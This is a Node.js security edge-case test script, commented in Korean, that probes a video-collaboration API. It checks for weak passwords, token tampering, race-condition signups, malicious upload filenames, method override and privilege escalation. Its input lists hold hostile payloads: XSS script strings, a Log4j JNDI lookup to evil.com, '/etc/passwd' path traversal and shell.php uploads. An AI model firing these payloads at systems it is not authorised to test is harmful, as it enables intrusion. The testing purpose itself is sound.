/**
 * VideoPlanet API 엣지 케이스 심화 테스트
 * 
 * 통합 테스트에서 발견된 문제점들을 더 자세히 분석합니다.
 */

const axios = require('axios');
const FormData = require('form-data');

const API_BASE_URL = process.env.REACT_APP_API_BASE_URL || 'https://videoplanet.up.railway.app';
const axiosInstance = axios.create({
  baseURL: API_BASE_URL,
  timeout: 30000,
  withCredentials: true,
});

// 테스트용 토큰 (실제 테스트 시 유효한 토큰으로 교체 필요)
let authToken = null;

// 테스트 결과 저장
const edgeCaseResults = {
  vulnerabilities: [],
  performance: [],
  dataIntegrity: [],
};

// 유틸리티 함수
function logEdgeCase(category, testName, severity, details) {
  const result = {
    testName,
    severity, // 'HIGH', 'MEDIUM', 'LOW'
    details,
    timestamp: new Date().toISOString(),
  };
  
  console.log(`[${severity}] ${testName}: ${details}`);
  edgeCaseResults[category].push(result);
}

// 1. 인증 관련 엣지 케이스
async function testAuthEdgeCases() {
  console.log('\n=== 인증 엣지 케이스 테스트 ===\n');
  
  // 1-1. 비밀번호 복잡도 테스트
  const weakPasswords = [
    '123456',
    'password',
    'qwerty',
    '12345678',
    'abc123',
    '',
    ' ',
    'a'.repeat(1000),
  ];
  
  for (const password of weakPasswords) {
    try {
      await axiosInstance.post('/users/signup', {
        email: `weak_pwd_${Date.now()}@test.com`,
        password: password,
        nickname: `WeakPwd${Date.now()}`,
        name: 'Test User',
      });
      logEdgeCase('vulnerabilities', '약한 비밀번호 허용', 'HIGH', 
        `비밀번호 "${password.substring(0, 20)}..." 허용됨`);
    } catch (error) {
      if (error.response?.status === 400) {
        console.log(`✅ 약한 비밀번호 차단: "${password.substring(0, 20)}..."`);
      }
    }
  }
  
  // 1-2. 이메일 형식 테스트
  const invalidEmails = [
    'notanemail',
    '@example.com',
    'user@',
    'user@@example.com',
    'user@example',
    'user@.com',
    'user@example..com',
    '<script>alert("xss")</script>@example.com',
    'user+tag@example.com', // 이건 유효해야 함
  ];
  
  for (const email of invalidEmails) {
    try {
      await axiosInstance.post('/users/check_email', { email });
      logEdgeCase('dataIntegrity', '잘못된 이메일 형식 허용', 'MEDIUM', 
        `이메일 "${email}" 허용됨`);
    } catch (error) {
      console.log(`✅ 잘못된 이메일 차단: "${email}"`);
    }
  }
  
  // 1-3. 동일 사용자 다중 회원가입 시도
  console.log('\n동일 이메일 다중 회원가입 시도...');
  const testEmail = `concurrent_${Date.now()}@test.com`;
  const signupPromises = [];
  
  for (let i = 0; i < 5; i++) {
    signupPromises.push(
      axiosInstance.post('/users/signup', {
        email: testEmail,
        password: 'Test123!@#',
        nickname: `ConcurrentUser${i}`,
        name: 'Test User',
      }).catch(e => e)
    );
  }
  
  const results = await Promise.all(signupPromises);
  const successCount = results.filter(r => !(r instanceof Error) && r.status === 200).length;
  
  if (successCount > 1) {
    logEdgeCase('dataIntegrity', '동시 회원가입 중복 허용', 'HIGH', 
      `${successCount}개의 동일 이메일 계정 생성됨`);
  } else {
    console.log('✅ 동시 회원가입 중복 방지 성공');
  }
  
  // 1-4. 토큰 조작 테스트
  if (authToken) {
    const manipulatedTokens = [
      authToken + 'x', // 토큰 끝에 문자 추가
      authToken.slice(0, -1), // 토큰 끝 문자 제거
      'Bearer ' + authToken, // Bearer 중복
      '', // 빈 토큰
      'null',
      'undefined',
      btoa(JSON.stringify({user_id: 1, exp: Date.now() + 3600000})), // 가짜 JWT
    ];
    
    for (const token of manipulatedTokens) {
      try {
        const testAxios = axios.create({
          baseURL: API_BASE_URL,
          headers: { Authorization: `Bearer ${token}` },
        });
        await testAxios.get('/projects/project_list');
        logEdgeCase('vulnerabilities', '조작된 토큰 허용', 'HIGH', 
          `토큰 "${token.substring(0, 20)}..." 허용됨`);
      } catch (error) {
        if (error.response?.status === 401) {
          console.log('✅ 조작된 토큰 차단됨');
        }
      }
    }
  }
}

// 2. 프로젝트 관련 엣지 케이스
async function testProjectEdgeCases() {
  console.log('\n=== 프로젝트 엣지 케이스 테스트 ===\n');
  
  if (!authToken) {
    console.log('인증 토큰 없음 - 프로젝트 테스트 스킵');
    return;
  }
  
  axiosInstance.defaults.headers.common['Authorization'] = `Bearer ${authToken}`;
  
  // 2-1. 특수문자 및 인코딩 테스트
  const specialNames = [
    '"><script>alert("XSS")</script>',
    '${jndi:ldap://evil.com/a}', // Log4j 공격 패턴
    '../../../etc/passwd',
    'प्रोजेक्ट', // 힌디어
    '🚀🎯📊', // 이모지
    '\u0000null\u0000', // NULL 바이트
    '\\x00\\x01\\x02', // 바이트 시퀀스
    ' '.repeat(1000), // 공백만
    'A'.repeat(10000), // 매우 긴 이름
  ];
  
  for (const name of specialNames) {
    try {
      const formData = new FormData();
      formData.append('name', name);
      formData.append('description', 'Test');
      
      const res = await axiosInstance.post('/projects/create', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });
      
      logEdgeCase('vulnerabilities', '특수문자 처리', 'MEDIUM', 
        `프로젝트 이름 "${name.substring(0, 50)}..." 허용됨`);
    } catch (error) {
      console.log(`✅ 특수문자 차단 또는 처리: "${name.substring(0, 20)}..."`);
    }
  }
  
  // 2-2. 날짜 범위 테스트
  const invalidDates = [
    { start_date: '2025-01-01', end_date: '2024-01-01' }, // 종료일이 시작일보다 이전
    { start_date: '9999-12-31', end_date: '9999-12-31' }, // 미래의 극단적 날짜
    { start_date: '1900-01-01', end_date: '1900-01-01' }, // 과거의 극단적 날짜
    { start_date: 'not-a-date', end_date: 'not-a-date' }, // 잘못된 날짜 형식
    { start_date: null, end_date: null }, // NULL 값
  ];
  
  for (const dates of invalidDates) {
    try {
      await axiosInstance.post('/projects/date_update/1', dates);
      logEdgeCase('dataIntegrity', '잘못된 날짜 허용', 'MEDIUM', 
        `날짜 범위 ${JSON.stringify(dates)} 허용됨`);
    } catch (error) {
      console.log('✅ 잘못된 날짜 차단됨');
    }
  }
  
  // 2-3. 파일 업로드 취약점 테스트
  const maliciousFileNames = [
    '../../../etc/passwd',
    'shell.php',
    'virus.exe',
    '.htaccess',
    'web.config',
    '../../../../index.html',
  ];
  
  for (const fileName of maliciousFileNames) {
    try {
      const formData = new FormData();
      formData.append('file', Buffer.from('malicious content'), fileName);
      
      await axiosInstance.post('/feedbacks/1', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });
      
      logEdgeCase('vulnerabilities', '위험한 파일명 허용', 'HIGH', 
        `파일명 "${fileName}" 업로드 허용됨`);
    } catch (error) {
      console.log(`✅ 위험한 파일명 차단: "${fileName}"`);
    }
  }
}

// 3. 성능 및 리소스 테스트
async function testPerformanceEdgeCases() {
  console.log('\n=== 성능 엣지 케이스 테스트 ===\n');
  
  // 3-1. 대량 데이터 요청
  try {
    const params = new URLSearchParams();
    params.append('limit', '999999');
    params.append('offset', '0');
    
    const startTime = Date.now();
    await axiosInstance.get(`/projects/project_list?${params}`);
    const responseTime = Date.now() - startTime;
    
    if (responseTime > 5000) {
      logEdgeCase('performance', '대량 데이터 요청 성능', 'MEDIUM', 
        `응답 시간: ${responseTime}ms`);
    }
  } catch (error) {
    console.log('대량 데이터 요청 테스트 실패');
  }
  
  // 3-2. 깊은 중첩 JSON
  const deeplyNested = {};
  let current = deeplyNested;
  for (let i = 0; i < 1000; i++) {
    current.nested = {};
    current = current.nested;
  }
  current.value = 'deep';
  
  try {
    await axiosInstance.post('/projects/create', deeplyNested);
    logEdgeCase('vulnerabilities', '깊은 중첩 JSON 허용', 'MEDIUM', 
      'Stack overflow 위험');
  } catch (error) {
    console.log('✅ 깊은 중첩 JSON 차단됨');
  }
  
  // 3-3. 슬로우 로리스 공격 시뮬레이션
  console.log('슬로우 로리스 공격 테스트...');
  const slowConnections = [];
  
  for (let i = 0; i < 5; i++) {
    const slowAxios = axios.create({
      baseURL: API_BASE_URL,
      timeout: 60000,
      headers: {
        'X-Slow-Test': 'true',
      },
    });
    
    slowConnections.push(
      slowAxios.get('/projects/project_list', {
        onDownloadProgress: () => {
          // 의도적으로 느리게 처리
          const delay = new Date().getTime() + 100;
          while (new Date().getTime() < delay) {}
        },
      }).catch(e => e)
    );
  }
  
  const slowResults = await Promise.all(slowConnections);
  const timeoutCount = slowResults.filter(r => r.code === 'ECONNABORTED').length;
  
  if (timeoutCount === 0) {
    logEdgeCase('vulnerabilities', '슬로우 로리스 방어 부재', 'MEDIUM', 
      '모든 느린 연결이 유지됨');
  }
}

// 4. 권한 우회 시도
async function testAuthorizationBypass() {
  console.log('\n=== 권한 우회 테스트 ===\n');
  
  // 4-1. HTTP 메서드 오버라이드
  const overrideMethods = [
    { header: 'X-HTTP-Method-Override', value: 'DELETE' },
    { header: 'X-HTTP-Method', value: 'DELETE' },
    { header: 'X-Method-Override', value: 'DELETE' },
  ];
  
  for (const override of overrideMethods) {
    try {
      await axiosInstance.post('/projects/detail/1', {}, {
        headers: { [override.header]: override.value },
      });
      logEdgeCase('vulnerabilities', 'HTTP 메서드 오버라이드 허용', 'HIGH', 
        `헤더 ${override.header} 작동`);
    } catch (error) {
      console.log(`✅ HTTP 메서드 오버라이드 차단: ${override.header}`);
    }
  }
  
  // 4-2. 권한 상승 시도
  const privilegeEscalationAttempts = [
    { role: 'admin' },
    { role: 'Owner' },
    { is_admin: true },
    { permissions: ['*'] },
  ];
  
  for (const attempt of privilegeEscalationAttempts) {
    try {
      await axiosInstance.patch('/users/profile', attempt);
      logEdgeCase('vulnerabilities', '권한 상승 허용', 'CRITICAL', 
        `권한 변경 시도 ${JSON.stringify(attempt)} 성공`);
    } catch (error) {
      console.log('✅ 권한 상승 시도 차단됨');
    }
  }
}

// 메인 실행 함수
async function runEdgeCaseTests() {
  console.log('========================================');
  console.log('VideoPlanet API 엣지 케이스 심화 테스트');
  console.log(`API URL: ${API_BASE_URL}`);
  console.log('========================================');
  
  // 먼저 로그인하여 토큰 획득
  try {
    const loginRes = await axiosInstance.post('/users/login', {
      email: 'test@example.com',
      password: 'password123',
    });
    authToken = loginRes.data.vridge_session || loginRes.data.token;
    console.log('✅ 테스트용 토큰 획득 성공');
  } catch (error) {
    console.log('❌ 로그인 실패 - 일부 테스트 제한됨');
  }
  
  // 테스트 실행
  await testAuthEdgeCases();
  await testProjectEdgeCases();
  await testPerformanceEdgeCases();
  await testAuthorizationBypass();
  
  // 결과 요약
  console.log('\n========================================');
  console.log('엣지 케이스 테스트 결과 요약');
  console.log('========================================');
  
  const criticalCount = Object.values(edgeCaseResults)
    .flat()
    .filter(r => r.severity === 'CRITICAL').length;
  const highCount = Object.values(edgeCaseResults)
    .flat()
    .filter(r => r.severity === 'HIGH').length;
  const mediumCount = Object.values(edgeCaseResults)
    .flat()
    .filter(r => r.severity === 'MEDIUM').length;
  
  console.log(`CRITICAL 위험: ${criticalCount}개`);
  console.log(`HIGH 위험: ${highCount}개`);
  console.log(`MEDIUM 위험: ${mediumCount}개`);
  
  if (criticalCount > 0) {
    console.log('\n⚠️  즉시 조치가 필요한 CRITICAL 위험이 발견되었습니다!');
  }
  
  // 상세 결과 출력
  console.log('\n=== 발견된 취약점 ===');
  edgeCaseResults.vulnerabilities.forEach(v => {
    console.log(`[${v.severity}] ${v.testName}: ${v.details}`);
  });
  
  console.log('\n=== 데이터 무결성 문제 ===');
  edgeCaseResults.dataIntegrity.forEach(d => {
    console.log(`[${d.severity}] ${d.testName}: ${d.details}`);
  });
  
  console.log('\n=== 성능 문제 ===');
  edgeCaseResults.performance.forEach(p => {
    console.log(`[${p.severity}] ${p.testName}: ${p.details}`);
  });
  
  // 결과 파일 저장
  const fs = require('fs');
  const resultPath = `edge-case-results-${Date.now()}.json`;
  fs.writeFileSync(resultPath, JSON.stringify(edgeCaseResults, null, 2));
  console.log(`\n상세 결과가 ${resultPath}에 저장되었습니다.`);
}

// 실행
if (require.main === module) {
  runEdgeCaseTests().catch(console.error);
}

module.exports = { runEdgeCaseTests };